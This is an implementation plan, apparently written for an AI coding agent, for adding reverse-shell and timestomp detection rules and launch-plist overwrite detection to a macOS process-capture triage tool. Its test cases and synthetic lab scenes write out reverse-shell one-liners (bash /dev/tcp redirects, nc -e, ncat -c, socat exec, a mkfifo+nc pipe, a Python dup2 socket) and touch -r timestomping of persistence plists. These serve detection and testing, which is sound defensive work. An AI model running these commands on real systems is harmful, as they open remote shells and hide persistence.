# Reverse shells, timestamp faking and plist overwrites: Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Two new rules (`reverse-shell`, `timestomp`), and `persistence-plist` counting launch plists overwritten in place.

**Architecture:** The parser records whether an exec's stdin is a socket, and turns a modified `close` into a `write` FileOp. The two new rules live in `src/rules/rules.ts` in the existing `Rule` shape. Each rule ships with its README row, Guide stage, MITRE names and learning-lab scene in the same task, because tests require all four for every rule.

**Tech Stack:** TypeScript, Vitest, bash (`scripts/ficus-lab.sh`).

**Spec:** `docs/superpowers/specs/2026-11-17-reverse-shell-timestomp-plist-overwrite-design.md`. Read it first; this plan argues from it.

## Global Constraints

- Work on a new branch `rules-revshell-timestomp`, cut from `main`, not from `timeline-tab`.
- No change to the README's capture command, to `RECORDER` in `scripts/ficus-clean.sh`, or to the live lab's recorder.
- Command-line triggers key on words (`/dev/tcp/`, `-e`, `exec:`), never on hosts or ports, so findings survive `ficus-clean.sh`.
- fd types: 1 vnode, 2 socket, 6 pipe.
- The test fixture `test/fixtures/synthetic-lab.jsonl` and `scripts/make-synthetic-lab.mjs` stay untouched: tests count its lines and findings. New scenes go in `scripts/ficus-lab.sh synthetic` only.
- `npm test` runs `pretest` (a full vite build), so run single files with `npx vitest run test/<file>` while iterating.

## Review Focus

1. **Reverse-shell noise from tools.** `git`, `docker-tools` or `ps` started by Node or VS Code with socket stdin must raise nothing. Trigger 1 applies only to shells and interpreters that read commands from stdin. Pinned in Task 2.
2. **A `/dev/tcp` port check.** `bash -c '</dev/tcp/localhost/5432'` and `echo > /dev/tcp/db/5432` raise nothing. Pinned in Task 2.
3. **Apple's `nc -c`.** `nc -c host 25` (send CRLF) raises nothing, while `ncat -c bash host 4444` is high. Pinned in Task 2.
4. **`touch -r REF target`.** The reference file is never treated as a target. A relative target resolves against the exec's `cwd`. Pinned in Task 3.
5. **A capture full of unmodified `close` events.** None of them become FileOps; all are counted in `otherEvents.close`. Pinned in Task 1.

---

### Task 1: Parse socket stdin and modified closes

**Files:**
- Modify: `src/model/types.ts` (`NormEvent`, `Image`, `FileOp`)
- Modify: `src/model/parse.ts` (`normalize`)
- Modify: `src/model/builder.ts` (exec image creation around line 173; file-op case around line 183)
- Modify: `test/synth.ts` (`img` default gains `stdinIsSocket: null`)
- Test: `test/parse.test.ts`, `test/builder.test.ts`

**Interfaces:**
- Produces:
  - `NormEvent.stdinIsSocket?: boolean | null` and `Image.stdinIsSocket: boolean | null`. `null` when the exec had no `fds` array; otherwise true iff the entry with `fd === 0` has `fdtype === 2`.
  - `NormEvent.viaClose?: true`, and `FileOp.via?: 'close'`.
  - A `close` event with `modified === true` normalizes to `kind: 'write'`, `rawType: 'close'`, `path: e.target?.path`, `viaClose: true`. Any other `close` is `kind: 'other'`.

- [ ] **Step 1: Create the branch**

```bash
git switch main && git pull --ff-only && git switch -c rules-revshell-timestomp
```

The untracked spec and this plan come along. Commit them first: `git add docs/superpowers && git commit -m "docs: spec and plan for reverse-shell, timestomp, plist overwrite"`.

- [ ] **Step 2: Write the failing tests** in `test/parse.test.ts`. Build each line with `JSON.stringify`, copying the envelope of an exec line from `test/fixtures/synthetic-lab.jsonl` and changing `event`.

```ts
test('exec: stdin socket', () => {
  // fds [{fd:0,fdtype:2},{fd:1,fdtype:2},{fd:2,fdtype:2}]
  expect(ev.stdinIsSocket).toBe(true); expect(ev.stdinIsPipe).toBe(false);
});
test('exec: stdin vnode is not a socket; no fds is null', () => {
  expect(vnode.stdinIsSocket).toBe(false); expect(noFds.stdinIsSocket).toBeNull();
});
test('close modified becomes a write from a close', () => {
  // event: {close:{modified:true,target:{path:'/Library/LaunchDaemons/x.plist'},was_mapped_writable:false}}
  expect(ev).toMatchObject({ kind: 'write', rawType: 'close', path: '/Library/LaunchDaemons/x.plist', viaClose: true });
});
test('close not modified is other', () => { expect(ev.kind).toBe('other'); });
```

And in `test/builder.test.ts` (Review Focus 5):

```ts
test('modified close is a write FileOp marked via close; unmodified closes are only counted', () => {
  // one process: 3 unmodified closes, 1 modified close of /Users/u/Library/LaunchAgents/a.plist
  expect(p.fileOps).toEqual([expect.objectContaining({ kind: 'write', path: '/Users/u/Library/LaunchAgents/a.plist', via: 'close' })]);
  expect(m.stats.otherEvents.close).toBe(3);
  expect(m.stats.kinds?.close).toBe(1);
});
```

- [ ] **Step 3: Run them and confirm they fail**

Run: `npx vitest run test/parse.test.ts test/builder.test.ts`
Expected: the new tests FAIL (`stdinIsSocket` undefined; close is `other`).

- [ ] **Step 4: Implement**
  - In `normalize`, set `stdinIsSocket` next to `stdinIsPipe`.
  - Special-case `rawType === 'close'` before the `KIND_BY_KEY` lookup.
  - In the builder, copy `stdinIsSocket` onto the exec'd `Image` the way `stdinIsPipe` is copied (an inherited image keeps the parent's value, as `stdinIsPipe` does). Push `via: 'close'` on the FileOp when `ev.viaClose`.
  - Add `stdinIsSocket: null` to `imageFrom` and to the `img()` default in `test/synth.ts`.

- [ ] **Step 5: Run the tests and `npx tsc --noEmit`; both pass**

Run: `npx vitest run test/parse.test.ts test/builder.test.ts && npx tsc --noEmit`
Expected: PASS, no type errors. Every other `Image` literal in the tests must compile; add the field where `tsc` complains.

- [ ] **Step 6: Commit**: `feat: record socket stdin on exec and read modified closes as writes`

---

### Task 2: `reverse-shell` rule

**Files:**
- Modify: `src/rules/rules.ts` (new rule after `shell-from-pipe`; helpers beside `pipeLang`)
- Modify: `src/rules/context.ts` (new helper)
- Modify: `src/rules/mitre.ts` (`'T1095': 'Non-Application Layer Protocol'`)
- Modify: `src/ui/GuideScreen.tsx` (`STAGES`, Execution stage gets `'reverse-shell'`)
- Modify: `README.md` (rules table row after `shell-from-pipe`)
- Modify: `scripts/ficus-lab.sh` (synthetic scenes, answer rows, a `#` line in the live key)
- Test: create `test/rule-reverse-shell.test.ts`; modify `test/lab-script.test.ts`

**Interfaces:**
- Consumes: `Image.stdinIsSocket` (Task 1); `pipeLang`'s stdin-reading test.
- Produces:
  - `export function sshAncestor(m: CaptureModel, p: Process): boolean` in `context.ts`. It walks `originalParent` (falling back to `currentParent`) up to 64 hops, guards against cycles, and returns true when the basename of any ancestor's latest non-inherited image path is `sshd` or `sshd-session`.
  - `export function reverseShellCommand(img: Image): string | null` in `rules.ts`. It returns a short label of the matched pattern (`'/dev/tcp redirect'`, `'ncat -e'`, `'socat exec:'`, `'fifo + nc'`, `'python socket + dup2'`, `'zsh ztcp'`), or null.
  - The rule: `id: 'reverse-shell'`, `title: 'Reverse shell'`, `severity: 'high'`, `levels: ['high', 'med']`, `mitre: ['T1059.004', 'T1059.006', 'T1059', 'T1095']`, `scope: 'image'`.

Trigger 1, socket on stdin, fires when:
- `img.stdinIsSocket === true`;
- the image is in `SHELLS`, or its basename is python, perl or ruby (versioned names included, as in `PIPE_LANGS`);
- it reads commands from stdin: reuse `readsStdin` with the matching `PipeLang`, but on the socket condition instead of `stdinIsPipe`. Factor a `stdinLang(img)` out of `pipeLang` so the two rules share it;
- it is the first such image in the process.

It is med if `sshAncestor`, else high. Its MITRE IDs are T1059.004 for a shell, T1059.006 for Python, T1059 for Perl and Ruby, plus T1095.

Trigger 2, command line, is always high, with MITRE T1059.004 and T1095. The patterns are in the spec, "`reverse-shell`" section. `nc` counts with `-e` only; `ncat` and `netcat` count with `-e`, `-c`, `--exec` or `--sh-exec`. A `/dev/tcp/` or `/dev/udp/` path needs a redirection of the shell's own descriptors: `>&`, `&>`, `0>&1`, `<&` or `0<` adjacent to the path, or `exec N<>`.

When both triggers fire on one image there is one finding, and the evidence names both.

- [ ] **Step 1: Write the failing tests** in `test/rule-reverse-shell.test.ts`, in the style of `test/rule-risky-parent-spawn.test.ts`. Use `apple()`, `img()`, `proc()` and `capture()` from `test/synth.ts`.

```ts
test('bash -i with socket stdin is high, T1059.004 + T1095', ...)           // severity 'high', mitre ['T1059.004','T1095']
test('python3 - with socket stdin is high, T1059.006', ...)
test('sh re-exec to bash with socket stdin gives one finding', ...)          // images [sh -i, bash -i], both socket: 1 finding
test('git, docker-tools, ps under node with socket stdin: nothing', ...)     // Review Focus 1
test('bash -c "ls" with socket stdin: nothing (runs no commands from stdin)', ...)
test('/bin/sh reading stdin from a socket under node is still high (the Node reverse shell)', ...)   // the investigator's decision
test('socket shell under sshd-session is med; under sshd -> zsh -> bash -i too', ...)
test('sh -c "/bin/bash -i >& /dev/tcp/192.168.4.225/1337 0>&1" is high', ...)
test('host shape does not matter: /dev/tcp/host1.internal.invalid/1337 still high', ...)
test('port checks are not flagged', ...)  // bash -c '</dev/tcp/localhost/5432'; sh -c 'echo > /dev/tcp/db/5432'  (Review Focus 2)
test('nc -e /bin/sh h 4444 high; ncat -c bash h 4444 high; nc -c h 25 nothing', ...)   // Review Focus 3
test('socat tcp:h:4444 exec:/bin/sh high', ...)
test('sh -c "mkfifo /tmp/f; nc h 4444 </tmp/f | sh >/tmp/f" high', ...)
test('python3 -c "import socket,os;...os.dup2(s.fileno(),0)..." high; python3 -c "import socket" nothing', ...)
test('zsh -c "zmodload zsh/net/tcp; ztcp h 4444" high', ...)
test('both triggers on one image: one finding naming both', ...)
```

- [ ] **Step 2: Run and confirm failure**

Run: `npx vitest run test/rule-reverse-shell.test.ts`
Expected: FAIL (no rule `reverse-shell`).

- [ ] **Step 3: Implement** the helpers and the rule. Write the explanation in the style of the neighbouring rules: what a reverse shell is, why a socket on a shell's stdin means one, and that an `ssh -T` session is the known benign look-alike (med).

- [ ] **Step 4: Run the rule tests; they pass**

Run: `npx vitest run test/rule-reverse-shell.test.ts`
Expected: PASS.

- [ ] **Step 5: Wire it in.**
  - Add the README row after `shell-from-pipe`: severity `high or med`, both triggers summarized, the sshd case, the port-check exclusion, the `nc -c` note, and "Needs `eslogger` schema 11 for the socket check". Cite all four MITRE IDs.
  - Add `'reverse-shell'` to the Execution stage in `STAGES`.
  - Add `T1095` to `MITRE_NAMES`.
  - Add `FDS_socket='[{"fd":0,"fdtype":2},{"fd":1,"fdtype":2},{"fd":2,"fdtype":2}]'` beside `FDS_pipe` in `ficus-lab.sh`.

- [ ] **Step 6: Add the synthetic lab scenes** in `ficus-lab.sh synthetic`, as new steps after the last existing one. Use the existing `ev_fork`, `ev_exec` and `answer` helpers.
  - **Attack:** a dropped unsigned program `/tmp/lab/netsvc` runs `sh -c '/bin/bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'` (fds `tty`). The sh forks a child that execs `/bin/bash -i` with fds `socket`.
  - **Answer rows:**
    - `reverse-shell high queued 'dev/tcp/192.168.56.10'` on the sh;
    - `reverse-shell high in-chain 'bash -i'` on the bash: use whatever queue status the lab actually yields, since `byMarker` must find exactly one process.
  - **Benign scenes:**
    - the learner's zsh runs `bash -c '</dev/tcp/localhost/5432'` (fds `tty`);
    - a `node` process runs `git status` with fds `socket`.

- [ ] **Step 7: Add a lab test** in `test/lab-script.test.ts` (the synthetic story `describe`):

```ts
test('benign look-alikes raise no reverse-shell finding', () => {
  for (const marker of ['</dev/tcp/localhost/5432', 'git status'])
    expect(allFindings(byMarker(m, marker)).map(f => f.ruleId)).not.toContain('reverse-shell');
});
```

`allFindings` is the union of `a.findings` and `a.contextOnly` for the process. Define it locally if no helper exists.

- [ ] **Step 8: Add to the live answer key** a `#` comment line: `#   reverse-shell: the live lab opens no reverse shell, even to loopback, so endpoint protection is not set off.`

- [ ] **Step 9: Run the affected suites; they pass**

Run: `npx vitest run test/rule-reverse-shell.test.ts test/lab-script.test.ts test/readme.test.ts test/guide-rules.test.ts test/rule-cases.test.ts test/clean-script.test.ts`
Expected: PASS. `clean-script` proves the findings survive cleaning (the 192.168 address becomes a placeholder).

- [ ] **Step 10: Commit**: `feat: reverse-shell rule: socket stdin on a command-reading shell, and reverse-shell command lines`

---

### Task 3: `timestomp` rule

**Files:**
- Modify: `src/rules/rules.ts`, `src/rules/mitre.ts` (`'T1070.006': 'Timestomp'`), `src/ui/GuideScreen.tsx` ("Getting past the defences" gets `'timestomp'`), `README.md`, `scripts/ficus-lab.sh`
- Test: create `test/rule-timestomp.test.ts`; modify `test/lab-script.test.ts`

**Interfaces:**
- Consumes: `parseOpts`, `optValues`, `resolvePath`, `oddLocation`, `LAUNCH_DIR`, `normPath`.
- Produces:
  - `const TOUCH_SPEC: OptSpec = { shortValues: 'Adrt', longValues: [] }`.
  - `const SETFILE_SPEC: OptSpec = { shortValues: 'acdmt', longValues: [] }`.
  - The rule: `id: 'timestomp'`, `title: 'File dates faked'`, `severity: 'low'`, `levels: ['high', 'low']`, `gated: 'when-low'`, `mitre: ['T1070.006']`, `scope: 'image'`.

How it matches:
- **Trigger:** basename `touch` with any of `-r`, `-t`, `-d`, `-A`, or `SetFile` with `-d` or `-m`.
- **Targets:** `parseOpts(...).positionals`, each resolved with `resolvePath(target, img.cwd)` when relative and `cwd` is known. The `-r` value is the reference, never a target.
- **High** when any target is:
  - a launch plist (`LAUNCH_DIR.test(normPath(t))`);
  - the path of any non-inherited image of any process in the capture (case-insensitive `normPath`);
  - in a strong odd place (`oddLocation(t)?.strength === 'strong'`).
- **Low** otherwise.
- **Evidence:** `"<cmdline>; <target> dated like <ref>"` for `-r`, or `"<cmdline>; <target> set to <value>"` for `-t`, `-d` or `-A`. Name the first target that made it high.

- [ ] **Step 1: Write the failing tests** in `test/rule-timestomp.test.ts`:

```ts
test('touch -r OneDrive plist onto another LaunchDaemons plist is high, evidence names the reference', ...)
  // evidence toContain('com.microsoft.OneDriveUpdaterDaemon.plist') and toContain('com.google.chromeplugin.plist')
test('the -r reference alone is never a target', ...)        // touch -r /Library/LaunchDaemons/a.plist ./build/out.o, cwd /Users/u/proj -> low  (Review Focus 4)
test('relative target resolves against cwd', ...)            // touch -t 202001010000 helper, cwd /tmp/x -> high (strong odd place)
test('target a program the capture ran is high', ...)        // second process ran /usr/local/bin/chrome_plugin; touch -d ... /usr/local/bin/chrome_plugin
test('build touch -t on its own outputs is low and context only', ...)   // not in analyze(m).queue; present in contextOnly
test('SetFile -d and -m count; SetFile -a does not', ...)
test('plain touch file, and touch -c -m file, are not flagged', ...)
```

- [ ] **Step 2: Run and confirm failure**: `npx vitest run test/rule-timestomp.test.ts` → FAIL.

- [ ] **Step 3: Implement the rule.** The explanation should say why the reference file matters: it shows which legitimate item the attacker hid behind. It should also say that date changes made through the API, rather than by `touch` or `SetFile`, are not visible in a capture.

- [ ] **Step 4: Run the rule tests; they pass.**

- [ ] **Step 5: Wire it in.**
  - **README row:** `high or low`; the triggers; high conditions; low context-only; the API blind spot; T1070.006.
  - **Guide stage:** add `'timestomp'` to "Getting past the defences".
  - **MITRE:** add T1070.006 to `MITRE_NAMES`.

- [ ] **Step 6: Synthetic lab.**
  - **Attack:** after the existing step that writes the stealer launch agent plist, the learner's shell runs `touch -r /Library/LaunchAgents/com.example.agent.plist "$AGENTS/<the stealer plist name>"`, with `cwd` `$CWD`. Use the lab's existing `com.example.agent` plist path as the reference, or any system-looking path.
  - **Answer row:** `timestomp high queued 'touch -r'`. Use the status the lab actually yields.
  - **Benign:** `touch -t 202001010000 build/out.o` with `cwd` `/Users/learner/proj`, `/Users/learner/proj/build/out.o` created just before by a `cc` process.
  - **Lab test:** add `'touch -t 202001010000'` to a check that its only `timestomp` finding is low and that the process is not queued (`queueStatus(a, p)` is `context`).

- [ ] **Step 7: Live lab.** Before the lab's launch agent is removed, run `touch -r /etc/hosts "$<the live plist variable>"` as a new step. Add the answer row `timestomp high queued 'touch -r /etc/hosts'`.

- [ ] **Step 8: Run the affected suites**, the same list as Task 2 Step 9 with `test/rule-timestomp.test.ts` in place of the reverse-shell file. Expected: PASS.

- [ ] **Step 9: Commit**: `feat: timestomp rule: touch and SetFile setting dates on launch plists, programs and staged files`

---

### Task 4: `persistence-plist` counts plists overwritten in place

**Files:**
- Modify: `src/rules/rules.ts` (`persistence-plist` `matchProcess`, around line 820)
- Modify: `src/ui/triage-model.ts` (`coverage`)
- Modify: `README.md` (`persistence-plist` row; the events list under "Capturing")
- Modify: `scripts/ficus-lab.sh` (new `ev_write` and `ev_close` helpers, a scene, an answer row)
- Test: create `test/rule-persistence-plist-overwrite.test.ts`; extend the existing `coverage` tests (find them with `grep -ln "coverage(" test/`)

**Interfaces:**
- Consumes: `FileOp.kind === 'write'` and `FileOp.via` (Task 1).
- Produces: in `coverage`, a note `{ id: 'none-write-close', level: 'info', title: 'No write or close events', checks: ['persistence-plist'] }`, added when `stats.kinds` exists and has no `write` and no `close`. Its detail: a launch plist overwritten in place cannot be seen; both event types are optional and noisy, so the recommended capture leaves them out.

How it matches:
- In `matchProcess`, `target` also takes `op.path` when `op.kind === 'write'`. The existing per-path `seen` set keeps a create followed by a write as one entry.
- The evidence for a path first reached through a write says `modified in place <path>`, adding ` (seen at close)` when `op.via === 'close'`. Create and rename keep `wrote`.

- [ ] **Step 1: Write the failing tests**:

```ts
test('a write to an existing LaunchDaemons plist is high, "modified in place"', ...)
test('a modified close to ~/Library/LaunchAgents/x.plist is high and says seen at close', ...)
test('create then write of the same plist by one process: one entry, says wrote', ...)
test('a write to a non-launch plist is not flagged', ...)
test('coverage: note none-write-close when neither kind is present; absent when close is present', ...)
```

- [ ] **Step 2: Run and confirm failure.**
- [ ] **Step 3: Implement** the rule change and the coverage note.
- [ ] **Step 4: Run the tests; they pass.**
- [ ] **Step 5: Docs.**
  - In the README's `persistence-plist` row, add "or modified one in place (a `write` event, or a `close` event marked modified)".
  - Under "Capturing", next to the existing `write` bullet, add one line: `close` is optional too, very noisy, and used when present; either `write` or `close` is needed to see a launch plist overwritten in place.
- [ ] **Step 6: Synthetic lab.**
  - Add `ev_write SECONDS handle path` (event `write`, `{"target":{file_obj}}`) and `ev_close SECONDS handle path modified` (event `close`, `{"modified":<bool>,"target":{file_obj},"was_mapped_writable":false}`).
  - **Scene:** a process overwrites an existing `/Library/LaunchDaemons/com.example.updater.plist` through a `write` and a modified `close`. That plist must not be created earlier in the lab.
  - **Answer row:** `persistence-plist high queued '<marker of that process>'`.
- [ ] **Step 7: Run the affected suites** (`test/rule-persistence-plist-overwrite.test.ts`, `test/lab-script.test.ts`, `test/readme.test.ts`, `test/clean-script.test.ts`, the coverage test file). Expected: PASS.
- [ ] **Step 8: Commit**: `feat: persistence-plist sees launch plists overwritten in place, via write or a modified close`

---

### Task 5: Whole-suite check and a look at the OBTS labs

- [ ] **Step 1:** `npm run build && npm test`. Expected: build OK, all tests pass. Real-capture suites skip when those captures are absent; say so in the PR if they did.
- [ ] **Step 2:** If `scratch/ficus-lab-live.jsonl` exists, run the engine on it and confirm no new `reverse-shell` findings. Also confirm no new non-context `timestomp` findings; that capture predates the live `touch -r` step, so it should show none.
- [ ] **Step 3 (optional, informational):** if the prototype converter still exists at `/private/tmp/claude-501/-Users-fioa8c--claude-spares-spare-t8qiAD/1fba5a4d-a4ec-4662-8761-6606135e7e8b/scratchpad/obts2es.mjs`, convert the OBTS fork_exec, ipc and persistence labs and report:
  - netcomsd's reverse shell, which should now be high;
  - `touch -r` on `com.google.chromeplugin.plist`, which should now be high.

  The plist overwrite stays unseen there: the lab has no `modified` flag.
- [ ] **Step 4:** Ask before pushing or opening a PR.
